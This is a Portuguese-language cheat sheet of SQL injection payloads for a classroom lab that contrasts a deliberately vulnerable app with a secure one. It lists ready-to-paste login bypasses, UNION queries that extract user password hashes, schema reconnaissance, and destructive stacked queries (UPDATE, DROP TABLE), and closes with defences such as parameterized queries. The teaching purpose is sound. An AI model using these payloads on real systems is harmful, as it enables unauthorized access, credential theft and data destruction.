# 🧾 Cheat-sheet de payloads — Laboratório SQL Injection

> ⚠️ **Uso exclusivamente educacional.** Todos os payloads abaixo funcionam
> **apenas** na app vulnerável (`http://localhost:3000`), que é insegura de
> propósito. Na app segura (`http://localhost:3001`) eles **não** funcionam —
> é justamente esse o contraste que a aula demonstra.

Cada item traz: **o payload** (pronto para colar), **em qual campo** usar e
**o que faz / por que funciona**.

---

## 🔑 Sobre a sintaxe de comentário do MySQL (importante!)

No MySQL há três formas de comentar o resto da linha. Usamos comentário para
"apagar" o pedaço da query que vem depois da nossa injeção:

| Comentário | Detalhe                                                      |
|------------|-------------------------------------------------------------|
| `-- `      | **Precisa de um espaço** depois dos dois traços. Sem o espaço, não é comentário. |
| `#`        | Comenta o resto da linha. Não precisa de espaço.            |
| `/* */`    | Comentário de bloco (menos usado nestes exemplos).          |

> 💡 Em caixas de texto de navegador, o espaço depois de `-- ` às vezes "some"
> visualmente. Se o payload com `-- ` não funcionar, troque por `#`.

---

## 1) 🚪 Login bypass (campo **Usuário** da tela de Login)

| # | Payload | Campo | O que faz / por que funciona |
|---|---------|-------|------------------------------|
| 1 | `admin' -- ` | Usuário (senha em branco) | Fecha a aspa do `username`, e o `-- ` comenta a checagem de senha. A query vira `... WHERE username = 'admin'`. Entra como **admin** sem saber a senha. |
| 2 | `admin'#` | Usuário (senha em branco) | Igual ao anterior, mas usando `#` como comentário (útil quando o espaço do `-- ` atrapalha). |
| 3 | `' OR '1'='1' -- ` | Usuário (senha em branco) | `'1'='1'` é sempre verdadeiro, então o `WHERE` casa com **todas** as linhas. A app pega a primeira (geralmente o admin) e autentica. |
| 4 | `' OR 1=1 -- ` | Usuário (senha em branco) | Mesma ideia da anterior, escrita com `1=1`. |
| 5 | `naoexiste' OR papel='admin' -- ` | Usuário (senha em branco) | Filtra explicitamente por quem tem `papel = 'admin'`. Mostra como o atacante escolhe **qual** conta assumir. |

**Antes/depois:** na app vulnerável, o payload autentica; na app segura,
qualquer um deles cai em "Usuário ou senha inválidos" (o `?` trata tudo como
texto literal).

---

## 2) 🧨 Error-based / descoberta (campo **Busca de produtos**)

Servem para "quebrar" a query de propósito e ler a mensagem de erro do MySQL,
ou para descobrir a estrutura da consulta.

| # | Payload | Campo | O que faz / por que funciona |
|---|---------|-------|------------------------------|
| 6 | `'` | Busca | Uma aspa solta desbalanceia a string e gera erro de sintaxe. A app vulnerável **mostra o erro cru** do MySQL (vazamento de informação). |
| 7 | `' ORDER BY 1 -- ` | Busca | Ordena pela 1ª coluna. Não dá erro. Vá aumentando o número... |
| 8 | `' ORDER BY 4 -- ` | Busca | Ainda funciona: a consulta tem **4 colunas** (id, nome, descricao, preco). |
| 9 | `' ORDER BY 5 -- ` | Busca | **Dá erro** ("Unknown column '5' in 'order clause'"). Confirma que são 4 colunas. É assim que se descobre o número de colunas para o UNION. |

---

## 3) 🎯 UNION-based extraction (campo **Busca de produtos**)

O `UNION` cola o resultado de um segundo `SELECT` no primeiro. Para funcionar,
os dois precisam ter o **mesmo número de colunas** (descoberto acima: **4**).

| # | Payload | Campo | O que faz / por que funciona |
|---|---------|-------|------------------------------|
| 10 | `' UNION SELECT NULL, NULL, NULL, NULL -- ` | Busca | Teste de "encaixe": confirma que um UNION com 4 colunas roda sem erro. Aparece uma linha vazia nos resultados. |
| 11 | `' UNION SELECT 1, username, senha_hash, papel FROM usuarios -- ` | Busca | **O ataque principal.** Puxa `username` e `senha_hash` da tabela `usuarios` para dentro da lista de "produtos". Os hashes aparecem na coluna *descricao*. |
| 12 | `' UNION SELECT id, username, senha_hash, papel FROM usuarios -- ` | Busca | Variante que mostra também o `id` real de cada usuário. |
| 13 | `x' UNION SELECT 1, table_name, column_name, 4 FROM information_schema.columns WHERE table_schema='sqli_lab' -- ` | Busca | Reconhecimento de schema: lista **tabelas e colunas** do banco. Mostra como o atacante mapeia o banco antes de mirar em `usuarios`. |

> 🔎 **Dica do `%`:** o campo de busca usa `LIKE '%...%'`. Começar o payload
> com `x'` (algo que não existe) faz a parte "produtos" retornar vazio, então
> a tela mostra **só** os dados injetados pelo UNION — fica mais limpo para a
> plateia. Usar `'` direto também funciona.

---

## 4) 💥 (Bônus) Stacked queries — só porque `multipleStatements: true`

> A app vulnerável liga `multipleStatements: true` no pool (veja
> `app_vulneravel/db.js`). Isso permite emendar um **segundo comando** com `;`.
> **NÃO** rode isto se quiser manter os dados do laboratório — é destrutivo.
> Sirva apenas para **explicar o risco**. Depois recrie o banco com
> `docker compose down -v && docker compose up -d`.

| # | Payload | Campo | O que faz / por que funciona |
|---|---------|-------|------------------------------|
| 14 | `'; UPDATE usuarios SET senha_hash = SHA2('hackeado', 256) WHERE username = 'admin'; -- ` | Busca | Emenda um `UPDATE` e troca a senha do admin. Só é possível porque (a) a query é concatenada, (b) `multipleStatements` está ligado e (c) o usuário do banco (root) tem permissão de UPDATE. |
| 15 | `'; DROP TABLE produtos; -- ` | Busca | Destrói uma tabela inteira. Demonstra o pior caso: input virando comando destrutivo. **Destrutivo — recrie o banco depois.** |

**Por que a app segura barra tudo isso de uma vez:**
1. `pool.execute(sql, [param])` → o input nunca vira código (mata 6–13).
2. `multipleStatements: false` → não dá para emendar `;` (mata 14–15).
3. Usuário MySQL só com `SELECT` → mesmo que passasse, não teria permissão de
   `UPDATE`/`DROP` (rede de segurança final).
